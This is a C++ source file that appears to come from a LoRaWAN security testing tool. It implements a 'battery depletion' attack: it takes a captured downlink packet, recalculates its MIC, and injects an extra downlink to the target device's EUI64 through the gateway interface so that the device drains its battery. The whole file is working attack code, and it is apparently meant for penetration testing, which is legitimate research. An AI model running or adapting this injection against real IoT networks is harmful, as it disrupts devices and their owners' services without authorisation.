#include "batterydepletion.h"
#include "Utils/logger.h"
#include "Utils/common.h"

#include <chrono>
#include <thread>

Lorawan_result BatteryDepletion::setUpSending(std::shared_ptr<LorawanPacket> packet)
{
    called(Logger::BatteryDepletion);
    testDevice->setEui64(packet->getEui64());

    downlink.setDstPort(packet->getDstPort());
    downlink.setSrcPort(packet->getSrcPort());

    return Lorawan_result::Success;
}

BatteryDepletion::BatteryDepletion()
{

}

Lorawan_result BatteryDepletion::stop()
{
    return Lorawan_result::Success;
}

Lorawan_result BatteryDepletion::sendExtraPacket(std::shared_ptr<DataPacket> downlinkPacket)
{
    std::string jsonToSend{};
    called(Logger::BatteryDepletion);
    DataPacket copyPacket(downlinkPacket);


    if(copyPacket.serialialize() != Lorawan_result::Success) //updated rawPacket
        return Lorawan_result::ErrorSerialize;


    if(Common::calculateMIC(copyPacket) != Lorawan_result::Success)
    {
        return Lorawan_result::ErrorCalcMIC;
    }

    if(copyPacket.serialialize() != Lorawan_result::Success)
        return Lorawan_result::ErrorSerialize;

    if(Common::createJsonToSend(copyPacket.getRawData(),copyPacket.getJsonString(),jsonToSend)
            != Lorawan_result::Success)
        return Lorawan_result::ErrorCreatingPacket;

    Tins::IP refIP = downlinkPacket->getPacketIP();
    downlink.setIP(refIP);
    writeLog(Logger::BruteforcingMIC,"packet is based on IP with id = " + std::to_string(refIP.id()));

    if(send(copyPacket.getMagicFour(),testDevice->getEui64(), jsonToSend) != Lorawan_result::Success)
        {
            writeLog(Logger::BatteryDepletion,"error sending extra downlink packet!");
        }


    return Lorawan_result::Success;
}

Lorawan_result BatteryDepletion::launch()
{
    writeLog(Logger::BatteryDepletion, "Launching battery attack");

    PacketStorage *storage = PacketStorage::getInstance();

    std::shared_ptr<DataPacket> downlinkPacket;

    if(storage->findFirstDownlink(downlinkPacket) == Lorawan_result::Success)
    {
        if(!downlinkPacket)
        {
           writeLog(Logger::BatteryDepletion, " no downlink packet available");
           return Lorawan_result::ErrorTestSetUp;
        }

//        writeLog(Logger::BatteryDepletion, "Timeout for 1 s");
//        std::chrono::milliseconds timespan(1000);
//        std::this_thread::sleep_for(timespan);

        if(setUpSending(downlinkPacket) != Lorawan_result::Success)
        {
            return Lorawan_result::ErrorTestSetUp;
        }

        if(sendExtraPacket(downlinkPacket) != Lorawan_result::Success)
        {
            return Lorawan_result::ErrorTest;
        }


        //TODO how to loop with prerequisite?

        return Lorawan_result::Success;

    } else
    {
        writeLog(Logger::BatteryDepletion, "No available packets to perform attack");
    }

    return Lorawan_result::Success;

}

Lorawan_result BatteryDepletion::send(bytes magicFour, bytes eui64, std::string json)
{
    bytes rawData;
    called(Logger::BatteryDepletion);
    bytes rawJson = Common::str2Bytes(json);

    rawData.insert(rawData.begin(),magicFour.begin(), magicFour.end());
    rawData.insert(rawData.end(),eui64.begin(), eui64.end());
    rawData.insert(rawData.end(),rawJson.begin(), rawJson.end());

    std::string dataToSend = Common::bytes2Str(rawData);

    writeLog(Logger::BatteryDepletion, "data to send: \n" + dataToSend);
    return downlink.send(dataToSend);
}
